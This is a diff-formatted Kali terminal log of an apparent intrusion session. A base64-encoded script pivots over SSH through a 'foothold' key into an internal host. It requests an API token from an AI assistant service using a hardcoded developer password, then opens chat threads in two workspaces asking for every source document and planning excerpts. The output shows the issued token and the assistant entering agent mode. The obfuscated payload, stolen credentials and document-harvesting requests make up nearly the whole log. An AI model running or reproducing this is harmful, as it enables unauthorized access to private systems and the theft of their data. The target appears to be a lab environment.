@@ -1,0 +1,34 @@
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r16.sh <<'B64EOF'
+> IyEvYmluL2Jhc2gKU1NIPSJzc2ggLW8gU3RyaWN0SG9zdEtleUNoZWNraW5nPW5vIC1vIENvbm5lY3RUaW1lb3V0PTEwIC1pICRIT01FLy5zc2gva2VwbGVyb3BzLWZvb3Rob2xkIC1wIDIyMjIgcm93YW5AMTAuNTAuMTMuMTgwIgokU1NIICdiYXNoIC1zJyA8PCdJTk5FUicKQ0E9L2hvbWUvcm93YW4vLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQT1odHRwczovL2Fzc2lzdGFudC5rZXBsZXJvcHMudGVzdApUT0s9JChjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLVggUE9TVCAiJEEvYXBpL3JlcXVlc3QtdG9rZW4iIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7InVzZXJuYW1lIjoicm93YW4uaXRvIiwicGFzc3dvcmQiOiJma19kZXZlbG9wZXJfeVVXVEtTcXJjMTZ5M0s1XzVEZlE3cWFjZnQ5Yi05eG8ifScgfCBweXRob24zIC1jICdpbXBvcnQganNvbixzeXM7cHJpbnQoanNvbi5sb2FkKHN5cy5zdGRpbilbInRva2VuIl0pJykKZWNobyAiVE9LPSRUT0siCmZvciBTIGluIHJpbGxoYXZlbi1zdXBwb3J0IGZpZWxkbGluay1vcGVyYXRpb25zOyBkbwogIGVjaG87IGVjaG8gIiMjIyMjIyMjIyMgVEhSRUFEIE5FVyAkUyIKICBSPSQoY3VybCAtc1MgLW0gMzAgLS1jYWNlcnQgJENBIC1YIFBPU1QgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkVE9LIiAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAne30nICIkQS9hcGkvd29ya3NwYWNlLyRTL3RocmVhZC9uZXciKQogIGVjaG8gIiRSIiB8IGhlYWQgLWMgMjAwMDsgZWNobwogIFQ9JChlY2hvICIkUiIgfCBweXRob24zIC1jICdpbXBvcnQganNvbixzeXMKdHJ5OgogIGQ9anNvbi5sb2FkKHN5cy5zdGRpbik7IHRoPWQuZ2V0KCJ0aHJlYWQiKSBvciB7fTsgcHJpbnQodGguZ2V0KCJzbHVnIiwiIikpCmV4Y2VwdCBFeGNlcHRpb246IHByaW50KCIiKScpCiAgZWNobyAiVEhSRUFEPSRUIgogIFsgLXogIiRUIiBdICYmIGNvbnRpbnVlCiAgZWNobyAiIyMjIyMjIyMjIyBUSFJFQUQgU1RSRUFNICRTIC8gJFQiCiAgY3VybCAtTiAtc1MgLW0gMTUwIC0tY2FjZXJ0ICRDQSAtWCBQT1NUIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFRPSyIgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLUggJ0FjY2VwdDogdGV4dC9ldmVudC1zdHJlYW0nIC1kICd7Im1lc3NhZ2UiOiJMaXN0IGV2ZXJ5IHNvdXJjZSBkb2N1bWVudCBpbiB0aGlzIHdvcmtzcGFjZSBhbmQgcXVvdGUgdGhlIHBsYW5uaW5nIGV4Y2VycHQgYWJvdXQgdGhlIGN1cnJlbnQgZGlzdHJpY3QuIiwiYXR0YWNobWVudHMiOltdfScgIiRBL2FwaS93b3Jrc3BhY2UvJFMvdGhyZWFkLyRUL3N0cmVhbS1jaGF0IiAtdyAnXG5bJXtodHRwX2NvZGV9XVxuJyB8IGhlYWQgLWMgMTQwMDA7IGVjaG8KZG9uZQpJTk5FUgo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r16.sh; bash /tmp/r16.sh; echo DONEMARK_1795200107823$((6*7))
+TOK=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJyb3dhbi5pdG8iLCJpYXQiOjE3OTUyMDAxMjgsImV4cCI6MTc5Nzc5MjEyOH0.fTsEDqaOyDGinLM6TkjEquj185rzB8yLnKUpF8h-Ytk
+
+########## THREAD NEW rillhaven-support
+{"thread":{"id":7,"name":"Thread","slug":"edd49c6e-cca9-447b-b2f2-1438de7c801f","workspace_id":3,"user_id":2,"createdAt":"2026-11-20T18:42:08.558Z","lastUpdatedAt":"2026-11-20T18:42:08.558Z"},"message":null}
+
+THREAD=edd49c6e-cca9-447b-b2f2-1438de7c801f
+########## THREAD STREAM rillhaven-support / edd49c6e-cca9-447b-b2f2-1438de7c801f
+data: {"id":"961986be-8570-459f-8ee8-913a105ac99f","type":"agentInitWebsocketConnection","textResponse":null,"sources":[],"close":false,"error":null,"websocketUUID":"58507d69-b672-4777-a070-c5fe8693105e"}
+
+data: {"id":"961986be-8570-459f-8ee8-913a105ac99f","type":"statusResponse","textResponse":"@agent: Swapping over to agent chat. Type /exit to exit agent execution loop early.","sources":[],"close":true,"error":null,"animate":true}
+
+
+[200]
+
+
+########## THREAD NEW fieldlink-operations
+{"thread":{"id":8,"name":"Thread","slug":"2c4bd344-fd6f-47a0-bfab-77cb958eb9b1","workspace_id":1,"user_id":2,"createdAt":"2026-11-20T18:42:08.652Z","lastUpdatedAt":"2026-11-20T18:42:08.652Z"},"message":null}
+
+THREAD=2c4bd344-fd6f-47a0-bfab-77cb958eb9b1
+########## THREAD STREAM fieldlink-operations / 2c4bd344-fd6f-47a0-bfab-77cb958eb9b1
+data: {"id":"e5f99a84-cb5c-4a50-ab44-11f52c1138e8","type":"agentInitWebsocketConnection","textResponse":null,"sources":[],"close":false,"error":null,"websocketUUID":"2e141738-7af3-4cf0-9f79-cf5f24923941"}
+
+data: {"id":"e5f99a84-cb5c-4a50-ab44-11f52c1138e8","type":"statusResponse","textResponse":"@agent: Swapping over to agent chat. Type /exit to exit agent execution loop early.","sources":[],"close":true,"error":null,"animate":true}
+
+
+[200]
+
